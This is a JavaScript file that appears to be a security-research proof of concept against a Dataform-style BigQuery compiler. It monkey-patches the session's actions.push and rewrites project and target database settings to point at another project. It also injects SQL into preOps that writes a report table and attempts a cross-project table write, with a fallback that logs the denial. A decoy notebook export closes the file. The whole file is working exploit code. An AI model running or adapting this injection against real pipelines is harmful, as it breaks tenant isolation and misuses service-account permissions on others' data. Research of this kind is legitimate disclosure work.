// XPROJ probe: test if canonicalProjectConfig / projectConfig / action.proto.target
// mutation persists into compiled SQL and changes which BQ project the SQL targets.

var s = global._DF_SESSION;
if (!s._xproj_done) {
  s._xproj_done = true;
  var orig = s.actions.push.bind(s.actions);
  var first = true;

  s.actions.push = function(action) {
    try {
      if (first && typeof action.preOps === 'function') {
        first = false;

        var rep = {};

        // ---- Capture BEFORE state ----
        try { rep.cpc_before = JSON.parse(JSON.stringify(s.canonicalProjectConfig)); } catch(e) { rep.cpc_before_err = e.message; }
        try { rep.pc_before = JSON.parse(JSON.stringify(s.projectConfig)); } catch(e) { rep.pc_before_err = e.message; }
        try { rep.tgt_before = JSON.parse(JSON.stringify(action.proto.target)); } catch(e) { rep.tgt_before_err = e.message; }
        try { rep.canon_tgt_before = JSON.parse(JSON.stringify(action.proto.canonicalTarget)); } catch(e) { rep.canon_tgt_before_err = e.message; }
        try { rep.action_keys = Object.keys(action.proto).join(','); } catch(e) {}
        try { rep.action_proto_prototype = Object.getOwnPropertyNames(Object.getPrototypeOf(action.proto || {})).join(','); } catch(e) {}

        // ---- Attempt mutations ----
        try {
          s.canonicalProjectConfig.defaultDatabase = 'bq-ssrf-org2-7576';
          rep.cpc_mut = 'set_ok';
        } catch(e) { rep.cpc_mut = 'ERR:' + e.message; }

        try {
          s.projectConfig.defaultDatabase = 'bq-ssrf-org2-7576';
          rep.pc_mut = 'set_ok';
        } catch(e) { rep.pc_mut = 'ERR:' + e.message; }

        try {
          action.proto.target.database = 'bq-ssrf-org2-7576';
          rep.tgt_mut = 'set_ok';
        } catch(e) { rep.tgt_mut = 'ERR:' + e.message; }

        try {
          action.proto.canonicalTarget.database = 'bq-ssrf-org2-7576';
          rep.canon_tgt_mut = 'set_ok';
        } catch(e) { rep.canon_tgt_mut = 'ERR:' + e.message; }

        // ---- Capture AFTER state ----
        try { rep.cpc_after = JSON.parse(JSON.stringify(s.canonicalProjectConfig)); } catch(e) {}
        try { rep.pc_after = JSON.parse(JSON.stringify(s.projectConfig)); } catch(e) {}
        try { rep.tgt_after = JSON.parse(JSON.stringify(action.proto.target)); } catch(e) {}
        try { rep.canon_tgt_after = JSON.parse(JSON.stringify(action.proto.canonicalTarget)); } catch(e) {}

        // ---- Inject SQL into preOps ----
        var BT = String.fromCharCode(96);
        var Q  = String.fromCharCode(39);
        var MARKER = 'XPROJ_' + Date.now();
        var rep_str = JSON.stringify(rep).replace(/'/g, '"').substring(0, 7000);

        // Always log mutation report to our OWN project (workflow SA has perms here)
        var sql_state =
          'CREATE OR REPLACE TABLE ' + BT + 'bq-ssrf-453453.injected_proof.XPROJ_STATE' + BT +
          ' AS SELECT ' + Q + MARKER + Q + ' AS marker, ' +
          Q + rep_str + Q + ' AS mutation_report, ' +
          'CURRENT_TIMESTAMP() AS ts, SESSION_USER() AS sa, @@project_id AS bq_project';

        // Attempt cross-project write — if workflow SA has perms in bq-ssrf-org2-7576,
        // this succeeds. If not, fails with PERMISSION_DENIED but proves the
        // attack surface (the SQL was generated and submitted).
        var sql_xproj =
          'CREATE OR REPLACE TABLE ' + BT + 'bq-ssrf-org2-7576.injected_proof.XPROJ_WITNESS' + BT +
          ' AS SELECT ' + Q + MARKER + Q + ' AS marker, ' +
          'CURRENT_TIMESTAMP() AS ts, SESSION_USER() AS sa, @@project_id AS bq_project';

        // BEGIN/EXCEPTION wrapper so xproj failure does NOT prevent state logging
        var sql_xproj_safe =
          'BEGIN ' + sql_xproj + '; ' +
          'EXCEPTION WHEN ERROR THEN ' +
          'CREATE OR REPLACE TABLE ' + BT + 'bq-ssrf-453453.injected_proof.XPROJ_DENIED' + BT +
          ' AS SELECT ' + Q + MARKER + Q + ' AS marker, @@error.message AS err_msg, ' +
          'CURRENT_TIMESTAMP() AS ts, SESSION_USER() AS sa; END';

        action.preOps([sql_state, sql_xproj_safe]);
      }
    } catch(e) {}
    return orig(action);
  };
}

module.exports.asJson = { cells: [], metadata: {}, nbformat: 4, nbformat_minor: 5 };
